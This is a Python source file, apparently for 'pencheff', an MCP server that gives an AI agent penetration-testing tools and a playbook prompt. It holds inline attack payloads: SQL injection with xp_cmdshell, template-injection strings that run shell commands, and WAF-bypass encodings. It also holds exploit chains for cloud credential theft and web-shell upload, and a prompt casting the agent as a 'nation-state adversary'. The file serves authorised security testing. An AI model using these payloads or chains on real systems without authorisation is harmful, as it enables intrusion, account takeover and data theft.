    """Test advanced attack vectors: HTTP request smuggling (CL.TE, TE.CL, TE.TE,
    H2.CL), web cache poisoning/deception, insecure deserialization (Java/Python/PHP/
    .NET/YAML), prototype pollution, and DNS rebinding susceptibility."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_advanced"

    from pencheff.modules.advanced.http_smuggling import HTTPSmugglingModule
    from pencheff.modules.advanced.cache_poisoning import CachePoisoningModule
    from pencheff.modules.advanced.deserialization import DeserializationModule
    from pencheff.modules.advanced.prototype_pollution import PrototypePollutionModule
    from pencheff.modules.advanced.dns_rebinding import DNSRebindingModule
    from pencheff.core.http_client import PencheffHTTPClient

    modules_map = {
        "http_smuggling": HTTPSmugglingModule,
        "cache_poisoning": CachePoisoningModule,
        "deserialization": DeserializationModule,
        "prototype_pollution": PrototypePollutionModule,
        "dns_rebinding": DNSRebindingModule,
    }

    selected = types or list(modules_map.keys())
    http = PencheffHTTPClient(session)
    all_findings = []
    stats = {"modules_run": []}

    try:
        for name in selected:
            if name in modules_map:
                mod = modules_map[name]()
                findings = await mod.run(session, http, targets=endpoints)
                all_findings.extend(findings)
                stats["modules_run"].append(name)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(all_findings)
    session.discovered.completed_modules.append("scan_advanced")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Found {new_count} advanced vulnerabilities. Review with get_findings.")
        next_steps.append("Use test_chain to build multi-step exploitation chains.")
    next_steps.append("Run exploit_chain_suggest to identify attack chains across all findings.")
    next_steps.append("Run scan_waf if not done — bypass techniques may unlock more findings.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "stats": stats,
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_subdomain_takeover(
    session_id: str,
    subdomains: list[str] | None = None,
) -> dict[str, Any]:
    """Detect subdomain takeover vulnerabilities: dangling CNAME records pointing to
    unclaimed services (GitHub Pages, S3, Heroku, Azure, Shopify, Fastly, Netlify,
    Vercel, and 20+ more). Uses discovered subdomains if none provided."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_subdomain_takeover"

    from pencheff.modules.recon.subdomain_takeover import SubdomainTakeoverModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = SubdomainTakeoverModule()
        findings = await mod.run(session, http, targets=subdomains)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_subdomain_takeover")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Found {new_count} subdomain takeover vulnerabilities! These enable phishing, cookie theft, and CSP bypass.")
    if session.discovered.cname_records:
        next_steps.append(f"Discovered {len(session.discovered.cname_records)} CNAME records for analysis.")
    next_steps.append("Run scan_infrastructure on discovered subdomains.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "cname_records": session.discovered.cname_records[:20],
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_websocket(
    session_id: str,
    websocket_urls: list[str] | None = None,
) -> dict[str, Any]:
    """Test WebSocket security: Cross-Site WebSocket Hijacking (CSWSH),
    authentication bypass, injection through WebSocket messages (SQLi/XSS/CMDi),
    insecure transport (ws:// vs wss://). Auto-discovers WebSocket endpoints
    from JavaScript files and upgrade probes."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_websocket"

    from pencheff.modules.advanced.websocket_security import WebSocketSecurityModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = WebSocketSecurityModule()
        findings = await mod.run(session, http, targets=websocket_urls)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_websocket")

    next_steps = []
    if session.discovered.websocket_endpoints:
        next_steps.append(f"Found {len(session.discovered.websocket_endpoints)} WebSocket endpoints.")
    if new_count > 0:
        next_steps.append("WebSocket vulnerabilities found — chain CSWSH with session hijacking.")
    next_steps.append("Run scan_auth for traditional authentication testing.")

    return {
        "websocket_endpoints": [ep["url"] for ep in session.discovered.websocket_endpoints],
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_mfa_bypass(
    session_id: str,
    login_url: str | None = None,
    mfa_url: str | None = None,
) -> dict[str, Any]:
    """Test 2FA/MFA bypass techniques: direct endpoint access (skip 2FA step),
    OTP brute force (rate limiting check), backup code abuse, response manipulation,
    race condition on code validation."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_mfa_bypass"

    from pencheff.modules.auth.mfa_bypass import MFABypassModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = MFABypassModule()
        config = {}
        if login_url:
            config["login_url"] = login_url
        if mfa_url:
            config["mfa_url"] = mfa_url
        findings = await mod.run(session, http, config=config or None)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_mfa_bypass")

    next_steps = []
    if new_count > 0:
        next_steps.append(f"Found {new_count} MFA bypass vulnerabilities — these are critical auth weaknesses.")
    next_steps.append("Run scan_auth for session management and JWT testing.")
    next_steps.append("Run exploit_chain_suggest to build auth bypass attack chains.")

    return {
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


@mcp.tool()
async def scan_oauth(
    session_id: str,
    oauth_endpoint: str | None = None,
    types: list[str] | None = None,
) -> dict[str, Any]:
    """Test OAuth/OIDC implementation security: redirect_uri manipulation and bypass,
    state parameter validation, token leakage via Referer, scope escalation, PKCE
    bypass. Auto-discovers OAuth endpoints if not provided."""
    session = _require_session(session_id)
    session.discovered.running_module = "scan_oauth"

    from pencheff.modules.auth.oauth_attacks import OAuthAttackModule
    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    try:
        mod = OAuthAttackModule()
        config = {"oauth_endpoint": oauth_endpoint} if oauth_endpoint else None
        findings = await mod.run(session, http, config=config)
    finally:
        await http.close()
        session.discovered.running_module = None

    new_count = session.findings.add_many(findings)
    session.discovered.completed_modules.append("scan_oauth")

    next_steps = []
    if session.discovered.oauth_endpoints:
        next_steps.append(f"Found {len(session.discovered.oauth_endpoints)} OAuth endpoints.")
    if new_count > 0:
        next_steps.append("OAuth vulnerabilities found — chain with open redirect for token theft.")
    next_steps.append("Run scan_auth for session management and JWT testing.")
    next_steps.append("Run scan_mfa_bypass if 2FA is implemented.")

    return {
        "oauth_endpoints": session.discovered.oauth_endpoints,
        "new_findings": new_count,
        "total_findings": session.findings.count,
        "findings_summary": session.findings.summary(),
        "next_steps": next_steps,
    }


# ─── Intelligence Tools ──────────────────────────────────────────────


@mcp.tool()
async def exploit_chain_suggest(session_id: str) -> dict[str, Any]:
    """Analyze all findings and suggest exploit chains that combine vulnerabilities
    for maximum impact. Returns ranked attack paths with step-by-step exploitation
    instructions. Run after completing scans to identify critical attack narratives."""
    session = _require_session(session_id)

    # Chain rules: (required_finding_categories, chain_name, description, combined_cvss)
    CHAIN_RULES = [
        (
            ["ssrf", "cloud"],
            "SSRF → Cloud Metadata → Credential Theft",
            "Exploit SSRF to access cloud metadata service (169.254.169.254), steal IAM credentials, and achieve full cloud account compromise.",
            9.8,
        ),
        (
            ["xss", "auth"],
            "XSS → Session Hijacking → Account Takeover",
            "Use XSS to steal session tokens via document.cookie, then hijack authenticated sessions for full account takeover.",
            9.1,
        ),
        (
            ["open_redirect", "oauth"],
            "Open Redirect → OAuth Token Theft",
            "Chain open redirect with OAuth redirect_uri bypass to steal authorization codes or access tokens.",
            9.1,
        ),
        (
            ["injection", "auth"],
            "SQL Injection → Credential Dump → Admin Access",
            "Extract credentials via SQLi, crack password hashes, and gain admin access. If passwords are reused, lateral movement is possible.",
            9.8,
        ),
        (
            ["file_handling", "injection"],
            "File Upload → Path Traversal → RCE",
            "Upload a web shell bypassing extension filters, use path traversal to place it in an executable directory, achieve Remote Code Execution.",
            9.8,
        ),
        (
            ["smuggling", "cache_poisoning"],
            "HTTP Smuggling → Cache Poisoning → Mass Compromise",
            "Use request smuggling to desync front-end/back-end, poison the cache with malicious content served to all users.",
            9.1,
        ),
        (
            ["prototype_pollution", "xss"],
            "Prototype Pollution → XSS Gadget → Stored XSS",
            "Pollute Object.prototype to trigger XSS via framework gadgets (jQuery, Lodash), achieving persistent cross-site scripting.",
            8.1,
        ),
        (
            ["idor", "authz"],
            "IDOR → PII Exposure → Data Breach",
            "Exploit IDOR to enumerate and access other users' personal data, constituting a reportable data breach.",
            8.1,
        ),
        (
            ["mfa_bypass", "auth"],
            "MFA Bypass → Authentication Bypass → Full Access",
            "Bypass 2FA via direct endpoint access or OTP brute force, gaining full authenticated access without the second factor.",
            9.1,
        ),
        (
            ["cors", "xss"],
            "CORS Misconfiguration → Cross-Origin Data Theft",
            "Exploit CORS wildcard or reflected origin to read authenticated API responses cross-origin, stealing sensitive data.",
            7.5,
        ),
        (
            ["subdomain_takeover"],
            "Subdomain Takeover → Phishing/Cookie Theft",
            "Claim the dangling subdomain, serve a phishing page or steal cookies scoped to the parent domain.",
            7.5,
        ),
        (
            ["deserialization"],
            "Insecure Deserialization → Remote Code Execution",
            "Exploit deserialization vulnerability with gadget chain payload to achieve arbitrary code execution on the server.",
            9.8,
        ),
        (
            ["websocket", "auth"],
            "WebSocket Hijacking → Real-time Data Theft",
            "Exploit CSWSH to hijack authenticated WebSocket connections, intercepting real-time data streams.",
            8.1,
        ),
        (
            ["mass_assignment", "authz"],
            "Mass Assignment → Privilege Escalation",
            "Inject admin role via mass assignment, escalate from regular user to administrator.",
            8.1,
        ),
    ]

    all_findings = session.findings.get_all()
    finding_categories = {f.category for f in all_findings}

    chains = []
    for required_cats, chain_name, description, combined_cvss in CHAIN_RULES:
        matching = [cat for cat in required_cats if cat in finding_categories]
        if len(matching) == len(required_cats):
            # Find the specific findings that form this chain
            chain_findings = [
                f for f in all_findings if f.category in required_cats
            ]
            chains.append({
                "chain_name": chain_name,
                "description": description,
                "combined_cvss": combined_cvss,
                "required_categories": required_cats,
                "matched_categories": matching,
                "supporting_findings": [
                    {"id": f.id, "title": f.title, "severity": f.severity.value, "endpoint": f.endpoint}
                    for f in chain_findings[:5]
                ],
                "exploitation_steps": description,
            })

    # Sort by combined CVSS
    chains.sort(key=lambda c: c["combined_cvss"], reverse=True)

    # Store in session
    session.discovered.exploit_chains = chains
    session.discovered.completed_modules.append("exploit_chain_suggest")

    next_steps = []
    if chains:
        next_steps.append(f"Identified {len(chains)} exploit chains. Use test_chain to verify the top chains.")
        next_steps.append(f"Most critical: '{chains[0]['chain_name']}' (CVSS {chains[0]['combined_cvss']})")
    else:
        next_steps.append("No exploit chains identified. Run more scan modules to discover chainable vulnerabilities.")
    next_steps.append("Run generate_report to include exploit chains in the final report.")

    return {
        "chains_found": len(chains),
        "chains": chains,
        "total_findings": session.findings.count,
        "next_steps": next_steps,
    }


@mcp.tool()
async def payload_generate(
    session_id: str,
    attack_type: str,
    context: dict | None = None,
) -> dict[str, Any]:
    """Generate context-aware payloads optimized for the target's tech stack and WAF.
    Uses discovered technology fingerprints and WAF detection results to produce
    payloads with the highest chance of success. Attack types: sqli, xss, ssti,
    cmdi, xxe, ssrf, ldap, open_redirect, waf_bypass, smuggling, deserialization."""
    session = _require_session(session_id)

    from pencheff.core.payload_loader import load_payloads

    tech_stack = context or session.discovered.tech_stack
    waf_info = session.discovered.waf_detected

    # Base payloads from files
    payload_files = {
        "sqli": "sqli.txt", "xss": "xss.txt", "ssti": "ssti.txt",
        "cmdi": "cmdi.txt", "xxe": "xxe.txt", "ssrf": "ssrf.txt",
        "ldap": "ldap.txt", "open_redirect": "open_redirect.txt",
        "waf_bypass": "waf_bypass.txt", "smuggling": "smuggling.txt",
        "deserialization": "deserialization.txt", "path_traversal": "path_traversal.txt",
        "prototype_pollution": "prototype_pollution.txt",
    }

    filename = payload_files.get(attack_type, f"{attack_type}.txt")
    base_payloads = load_payloads(filename)

    if not base_payloads:
        return {"error": f"No payloads found for attack type: {attack_type}", "payloads": []}

    # Tech-stack-aware mutations
    optimized = list(base_payloads)
    tech_additions: list[str] = []

    all_techs = []
    for techs in (tech_stack.values() if isinstance(tech_stack, dict) else []):
        all_techs.extend([t.lower() for t in techs])
    tech_str = " ".join(all_techs)

    if attack_type == "sqli":
        if "mysql" in tech_str:
            tech_additions.extend([
                "' AND SLEEP(5)-- -",
                "' UNION SELECT NULL,@@version,NULL-- -",
                "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))-- -",
            ])
        elif "postgres" in tech_str or "postgresql" in tech_str:
            tech_additions.extend([
                "'; SELECT pg_sleep(5)--",
                "' UNION SELECT NULL,version(),NULL--",
                "' AND 1=CAST((SELECT version()) AS int)--",
            ])
        elif "mssql" in tech_str or "sql server" in tech_str:
            tech_additions.extend([
                "'; WAITFOR DELAY '00:00:05'--",
                "' UNION SELECT NULL,@@version,NULL--",
                "'; EXEC xp_cmdshell('whoami')--",
            ])

    elif attack_type == "ssti":
        if "jinja" in tech_str or "flask" in tech_str or "python" in tech_str:
            tech_additions.extend([
                "{{config}}",
                "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
                "{{''.__class__.__mro__[1].__subclasses__()}}",
            ])
        elif "twig" in tech_str or "php" in tech_str or "symfony" in tech_str:
            tech_additions.extend([
                "{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}",
                "{{['id']|filter('system')}}",
            ])
        elif "freemarker" in tech_str or "java" in tech_str:
            tech_additions.extend([
                '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                '${T(java.lang.Runtime).getRuntime().exec("id")}',
            ])

    elif attack_type == "xss":
        if "angular" in tech_str:
            tech_additions.extend([
                "{{constructor.constructor('alert(1)')()}}",
                "<div ng-app ng-csp><script>alert(1)</script></div>",
            ])
        elif "react" in tech_str:
            tech_additions.extend([
                "javascript:alert(1)//",
                "<img src=x onerror='alert(1)'>",
            ])

    # WAF bypass encoding if WAF detected
    if waf_info and waf_info.get("vendor"):
        waf_vendor = waf_info["vendor"].lower()
        bypass_payloads = []

        for payload in (base_payloads + tech_additions)[:10]:
            # Double URL encoding
            import urllib.parse
            double_encoded = urllib.parse.quote(urllib.parse.quote(payload))
            bypass_payloads.append(double_encoded)

            # Case variation (for string-based WAF rules)
            if "<script>" in payload.lower():
                bypass_payloads.append(payload.replace("<script>", "<ScRiPt>").replace("</script>", "</ScRiPt>"))

            # Comment injection for SQL
            if "' OR" in payload or "' AND" in payload:
                bypass_payloads.append(payload.replace(" OR ", "/**/OR/**/").replace(" AND ", "/**/AND/**/"))

        tech_additions.extend(bypass_payloads)

    optimized.extend(tech_additions)

    # Deduplicate
    seen = set()
    unique_payloads = []
    for p in optimized:
        if p not in seen:
            seen.add(p)
            unique_payloads.append(p)

    return {
        "attack_type": attack_type,
        "tech_context": tech_str[:200] if tech_str else "none detected",
        "waf_context": waf_info.get("vendor", "none") if waf_info else "none",
        "total_payloads": len(unique_payloads),
        "base_payloads": len(base_payloads),
        "tech_specific_additions": len(tech_additions),
        "payloads": unique_payloads[:100],
        "next_steps": [
            f"Use these {len(unique_payloads)} payloads with test_endpoint for targeted testing.",
            "Run scan_injection or scan_client_side with optimized payloads.",
        ],
    }


# ─── Targeted Testing ─────────────────────────────────────────────────


@mcp.tool()
async def test_endpoint(
    session_id: str,
    method: str,
    url: str,
    headers: dict | None = None,
    body: str | None = None,
    payloads: list[str] | None = None,
    follow_redirects: bool = True,
) -> dict[str, Any]:
    """Run a targeted test against a specific endpoint. Use for manual/custom testing
    or to follow up on a finding. If payloads provided, sends one request per payload
    substituted into the body/URL."""
    session = _require_session(session_id)

    from pencheff.core.http_client import PencheffHTTPClient

    http = PencheffHTTPClient(session)
    results = []

    try:
        if payloads:
            for payload in payloads[:50]:  # cap at 50
                test_url = url.replace("PENCHEFF", payload)
                test_body = body.replace("PENCHEFF", payload) if body else None
                resp = await http.request(
                    method, test_url, headers=headers, body=test_body,
                    follow_redirects=follow_redirects, module="test_endpoint",
                )
                results.append({
                    "payload": payload,
                    "status": resp.status_code,
                    "length": len(resp.content),
                    "headers": dict(resp.headers),
                    "body_snippet": resp.text[:500],
                })
        else:
            resp = await http.request(
                method, url, headers=headers, body=body,
                follow_redirects=follow_redirects, module="test_endpoint",
            )
            results.append({
                "status": resp.status_code,
                "length": len(resp.content),
                "headers": dict(resp.headers),
                "body_snippet": resp.text[:1000],
            })
    finally:
        await http.close()

    return {"results": results, "request_count": len(results)}


@mcp.tool()
async def test_chain(session_id: str, steps: list[dict]) -> dict[str, Any]:
    """Execute a chain of requests for multi-step attack scenarios.
    Each step: {method, url, headers?, body?, extract?: {var_name: jsonpath}}.
    Variables from previous steps can be referenced as {{var_name}} in subsequent steps."""
    session = _require_session(session_id)

    from pencheff.core.http_client import PencheffHTTPClient
    import json
    import re

    http = PencheffHTTPClient(session)
    variables: dict[str, str] = {}
    results = []

    def substitute(text: str) -> str:
        if not text:
            return text
        for key, val in variables.items():
            text = text.replace(f"{{{{{key}}}}}", val)
        return text

    def extract_jsonpath_simple(data: Any, path: str) -> str | None:
        """Simple JSONPath-like extraction: $.key.subkey"""
        parts = path.lstrip("$.").split(".")
        current = data
        for part in parts:
            if isinstance(current, dict) and part in current:
                current = current[part]
            else:
                return None
        return str(current)

    try:
        for i, step in enumerate(steps):
            method = step.get("method", "GET")
            url = substitute(step["url"])
            headers = {k: substitute(v) for k, v in step.get("headers", {}).items()}
            body = substitute(step.get("body", ""))

            resp = await http.request(
                method, url, headers=headers or None,
                body=body or None, module="test_chain",
            )

            step_result = {
                "step": i + 1,
                "status": resp.status_code,
                "length": len(resp.content),
                "body_snippet": resp.text[:500],
            }

            # Extract variables for next steps
            extractions = step.get("extract", {})
            if extractions:
                try:
                    resp_json = resp.json()
                except Exception:
                    resp_json = {}
                for var_name, path in extractions.items():
                    val = extract_jsonpath_simple(resp_json, path)
                    if val:
                        variables[var_name] = val
                        step_result[f"extracted_{var_name}"] = val

            results.append(step_result)
    finally:
        await http.close()

    return {"steps": results, "variables": variables}


@mcp.tool()
async def analyze_response(
    session_id: str,
    url: str,
    response_status: int,
    response_headers: dict,
    response_body: str,
) -> dict[str, Any]:
    """Analyze an HTTP response for security issues: information disclosure,
    error messages, sensitive data in headers/body, technology fingerprints."""
    session = _require_session(session_id)
    issues = []

    # Check for information disclosure in headers
    sensitive_headers = ["server", "x-powered-by", "x-aspnet-version", "x-aspnetmvc-version"]
    for h in sensitive_headers:
        if h in {k.lower(): v for k, v in response_headers.items()}:
            issues.append({
                "type": "info_disclosure",
                "detail": f"Header '{h}' reveals server technology",
                "severity": "low",
            })

    # Check for error messages / stack traces
    error_patterns = [
        "stack trace", "traceback", "exception", "error in",
        "syntax error", "warning:", "fatal error", "debug",
        "mysql_", "pg_", "sqlite_", "ORA-", "SQLSTATE",
    ]
    body_lower = response_body.lower()
    for pattern in error_patterns:
        if pattern.lower() in body_lower:
            issues.append({
                "type": "error_disclosure",
                "detail": f"Response contains '{pattern}' — possible information leakage",
                "severity": "medium",
            })

    # Check for sensitive data patterns
    import re
    sensitive_patterns = {
        "email": r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}",
        "ip_address": r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b",
        "aws_key": r"AKIA[0-9A-Z]{16}",
        "jwt_token": r"eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+",
    }
    for name, pattern in sensitive_patterns.items():
        matches = re.findall(pattern, response_body)
        if matches:
            issues.append({
                "type": "sensitive_data",
                "detail": f"Found {len(matches)} potential {name} pattern(s)",
                "severity": "medium" if name in ("aws_key", "jwt_token") else "info",
            })

    # Security headers check
    header_keys = {k.lower() for k in response_headers}
    missing_security = []
    for h in ["strict-transport-security", "content-security-policy", "x-content-type-options", "x-frame-options"]:
        if h not in header_keys:
            missing_security.append(h)
    if missing_security:
        issues.append({
            "type": "missing_headers",
            "detail": f"Missing security headers: {', '.join(missing_security)}",
            "severity": "low",
        })

    return {
        "url": url,
        "status": response_status,
        "issues_found": len(issues),
        "issues": issues,
    }


# ─── Reporting ─────────────────────────────────────────────────────────


@mcp.tool()
async def get_findings(
    session_id: str,
    severity: str | None = None,
    category: str | None = None,
    owasp_category: str | None = None,
) -> dict[str, Any]:
    """Retrieve all findings, optionally filtered by severity, category, or OWASP category.
    Returns structured finding data with CVSS scores."""
    session = _require_session(session_id)
    sev = Severity(severity) if severity else None
    findings = session.findings.get_all(severity=sev, category=category, owasp_category=owasp_category)
    return {
        "count": len(findings),
        "summary": session.findings.summary(),
        "findings": [f.to_dict() for f in findings],
    }


@mcp.tool()
async def generate_report(
    session_id: str,
    report_type: str = "full",
    format: str = "markdown",
    compliance_frameworks: list[str] | None = None,
) -> dict[str, Any]:
    """Generate a penetration test report. Types: executive, technical, full.
    Formats: markdown, json. Includes CVSS scores, OWASP mapping, remediation, compliance."""
    session = _require_session(session_id)

    from pencheff.reporting.renderer import render_report

    report = render_report(
        session=session,
        report_type=report_type,
        output_format=format,
        compliance_frameworks=compliance_frameworks or ["owasp", "pci-dss", "nist"],
    )

    session.discovered.completed_modules.append("generate_report")

    return {
        "report_type": report_type,
        "format": format,
        "content": report,
    }


@mcp.tool()
async def check_dependencies(install_missing: bool = False) -> dict[str, Any]:
    """Check which pentest tools and Python packages are available, which are missing,
    and reports capability gaps."""
    report = check_all_dependencies()

    if install_missing and report["missing_required"]:
        import subprocess
        for pkg in report["missing_required"]:
            subprocess.run(
                ["pip", "install", pkg],
                capture_output=True, timeout=60,
            )
        report = check_all_dependencies()

    return report


# ─── MCP Prompts ───────────────────────────────────────────────────────


@mcp.prompt()
def pentest_methodology(target_url: str) -> str:
    """Elite penetration testing methodology — the definitive playbook for comprehensive security assessment."""
    return f"""You are the world's best ethical hacker — a master of offensive security with decades of
combined expertise across web application hacking, network penetration, cloud exploitation, API abuse,
and advanced persistent threat (APT) simulation. You approach {target_url} with the mindset of a
nation-state adversary but the ethics and discipline of a professional.

Your mission: Leave NO vulnerability undiscovered. Think like the most creative attacker on the planet.

═══════════════════════════════════════════════════════════════════
PHASE 1 — PREPARATION & INTELLIGENCE GATHERING
═══════════════════════════════════════════════════════════════════
  1. Call pentest_init with target URL, credentials, and test_depth='deep' for maximum coverage
  2. Call check_dependencies to inventory your arsenal — know your tools before battle

═══════════════════════════════════════════════════════════════════
PHASE 2 — RECONNAISSANCE (The Most Critical Phase)
═══════════════════════════════════════════════════════════════════
  "Give me six hours to chop down a tree and I will spend the first four sharpening the axe."

  3. Call recon_passive — DNS enumeration, certificate transparency logs, subdomain discovery,
     WHOIS intelligence, technology fingerprinting. Build a complete picture BEFORE touching the target.
  4. Call recon_active — port scanning, service fingerprinting, web crawling/spidering.
     Map EVERY entry point. Document EVERY technology. Note EVERY anomaly.
  5. Call recon_api_discovery — hunt for OpenAPI/Swagger specs, GraphQL endpoints, hidden APIs,
     debug endpoints, version-specific routes, admin panels.

  THINK: What is the full attack surface? Subdomains? Shadow APIs? Legacy endpoints?
  Third-party integrations? Cloud storage? CDN misconfigs? Exposed admin interfaces?

═══════════════════════════════════════════════════════════════════
PHASE 3 — INFRASTRUCTURE & CONFIGURATION ASSAULT
═══════════════════════════════════════════════════════════════════
  6. Call scan_infrastructure — but don't just check boxes. Analyze:
     - SSL/TLS: weak ciphers, certificate issues, protocol downgrade potential
     - Headers: missing CSP (can we inject?), missing HSTS (can we MITM?), CORS wildcards
     - HTTP methods: PUT/DELETE enabled? TRACE for XST? OPTIONS leaking info?
     - Think about HTTP request smuggling, host header injection, cache poisoning

═══════════════════════════════════════════════════════════════════
PHASE 4 — AUTHENTICATION DESTRUCTION
═══════════════════════════════════════════════════════════════════
  7. Call scan_auth — systematically dismantle auth mechanisms:
     - Session management: predictable tokens? no rotation? missing flags?
     - JWT attacks: none algorithm, key confusion (RS256→HS256), claim tampering, kid injection
     - OAuth/OIDC: redirect_uri manipulation, state parameter absence, token leakage
     - Brute force: account lockout bypass, rate limit circumvention, credential stuffing
     - Password policy: complexity requirements, common password acceptance
     - MFA bypass: backup code abuse, race conditions, channel switching

  8. Call scan_authz with MULTIPLE credential sets — this is where the gold is:
     - IDOR: can user A access user B's resources by changing IDs?
     - Vertical privilege escalation: can a regular user reach admin functions?
     - Horizontal privilege escalation: can users access peer data?
     - RBAC bypass: role manipulation, forced browsing, parameter tampering

═══════════════════════════════════════════════════════════════════
PHASE 4.5 — WAF DETECTION & BYPASS (Run Before Injection!)
═══════════════════════════════════════════════════════════════════
  8.5. Call scan_waf FIRST — intelligence on defenses is critical:
       - Fingerprint WAF vendor (Cloudflare, AWS WAF, Akamai, Imperva, ModSecurity, etc.)
       - Test bypass techniques: encoding, Unicode, case mutation, comment injection
       - Results inform ALL subsequent injection payloads

  8.6. Call payload_generate to create WAF-aware, tech-specific payloads

═══════════════════════════════════════════════════════════════════
PHASE 5 — INJECTION WARFARE (The Art of Code Execution)
═══════════════════════════════════════════════════════════════════
  9. Call scan_injection on ALL discovered endpoints — now includes 10 injection types:
     - SQL injection: error-based, blind boolean, time-based, stacked queries
     - NoSQL injection: MongoDB operator injection, JavaScript injection
     - Command injection: direct, blind (time/DNS-based), argument injection
     - SSTI: Jinja2, Twig, Freemarker, Velocity — each engine has unique RCE paths
     - XXE: file disclosure, SSRF via XXE, blind XXE with OOB exfiltration
     - SSRF: internal service access, cloud metadata (169.254.169.254), port scanning
     - LDAP injection: filter injection, authentication bypass, blind LDAP
     - Second-order injection: stored SQLi/XSS/SSTI via inject-then-trigger
     - Open redirect: redirect parameter injection with bypass techniques
     - Header injection: CRLF injection, response splitting, host header poisoning

  10. Call scan_client_side — browser-side attacks are underestimated:
      - XSS: reflected, stored, DOM-based, mutation XSS, polyglot payloads
      - CSRF: token absence, weak token validation, SameSite bypass, JSON CSRF
      - Clickjacking: frame busting bypass, drag-and-drop attacks

═══════════════════════════════════════════════════════════════════
PHASE 6 — ADVANCED ATTACKS (What Separates Elite from Average)
═══════════════════════════════════════════════════════════════════
  11. Call scan_advanced — the techniques that scanners miss:
      - HTTP request smuggling: CL.TE, TE.CL, TE.TE desync attacks
      - Cache poisoning: unkeyed header injection, cache deception
      - Deserialization: Java, Python pickle, PHP, .NET ViewState, YAML
      - Prototype pollution: server-side JSON, client-side URL parameters
      - DNS rebinding: host header validation, IP binding assessment

═══════════════════════════════════════════════════════════════════
PHASE 7 — API, BUSINESS LOGIC & SPECIALIZED
═══════════════════════════════════════════════════════════════════
  12. Call scan_api — now includes mass assignment testing:
      - GraphQL: introspection dump, query depth attacks, batching abuse
      - REST: mass assignment, BOLA/BFLA, excessive data exposure
      - Fuzzing: unexpected types, boundary values, null bytes

  13. Call scan_business_logic — the vulnerabilities NO scanner can find:
      - Race conditions: double-spend, TOCTOU, parallel account creation
      - Rate limiting: bypass via headers, IP rotation, parameter variation
      - Workflow bypass: skip steps, replay steps, manipulate state transitions

  14. Call scan_cloud if ANY cloud indicators found
  15. Call scan_file_handling if upload endpoints exist

═══════════════════════════════════════════════════════════════════
PHASE 8 — AUTH DEEP DIVE & SPECIALIZED ATTACKS
═══════════════════════════════════════════════════════════════════
  16. Call scan_oauth if OAuth/OIDC endpoints discovered:
      - redirect_uri manipulation and bypass
      - State parameter validation, token leakage, scope escalation

  17. Call scan_mfa_bypass if 2FA is implemented:
      - Direct endpoint access, OTP brute force, backup code abuse
      - Race condition on code validation

  18. Call scan_websocket if WebSocket endpoints discovered:
      - Cross-Site WebSocket Hijacking (CSWSH), auth bypass
      - Message injection (SQLi/XSS/CMDi via WebSocket)

  19. Call scan_subdomain_takeover on all discovered subdomains:
      - Dangling CNAME detection across 20+ services

═══════════════════════════════════════════════════════════════════
PHASE 9 — EXPLOITATION VERIFICATION & CHAINING
═══════════════════════════════════════════════════════════════════
  20. Review findings with get_findings — filter by severity='critical' first
  21. Use test_endpoint to MANUALLY VERIFY every critical and high finding
  22. Call exploit_chain_suggest to AUTOMATICALLY identify attack chains:
      - SSRF → Cloud metadata → AWS keys → Full compromise
      - XSS → Session theft → Admin access → Data exfiltration
      - Open redirect → OAuth token theft → Account takeover
      - HTTP smuggling → Cache poisoning → Mass user compromise
      - Deserialization → Remote Code Execution
      - Mass assignment → Privilege escalation → Admin access
  23. Use test_chain to demonstrate the top exploit chains with PoCs

  THINK LIKE AN ATTACKER: What is the maximum possible impact?

═══════════════════════════════════════════════════════════════════
PHASE 10 — COMPREHENSIVE REPORTING
═══════════════════════════════════════════════════════════════════
  24. Call generate_report with report_type='full' and all compliance frameworks
      - Every finding must have: proof of concept, impact analysis, CVSS score,
        OWASP mapping, remediation guidance, and compliance implications
      - Exploit chains should be documented as narratives showing business impact

═══════════════════════════════════════════════════════════════════
ELITE OPERATOR RULES:
═══════════════════════════════════════════════════════════════════
★ NEVER skip a phase — thoroughness separates amateurs from professionals
★ ALWAYS analyze results deeply before moving on — intelligence drives strategy
★ CHAIN vulnerabilities — a medium + a low can equal a critical
★ TEST edge cases that automated tools miss — null bytes, Unicode, encoding tricks
★ ADAPT your strategy in real-time based on what you discover
★ VERIFY every significant finding manually — false positives destroy credibility
★ THINK CREATIVELY — the best hackers find what others overlook
★ DOCUMENT EVERYTHING — reproducibility is the mark of a professional
★ ASK: "What would I do if I had unlimited time and skill?" — then do that"""
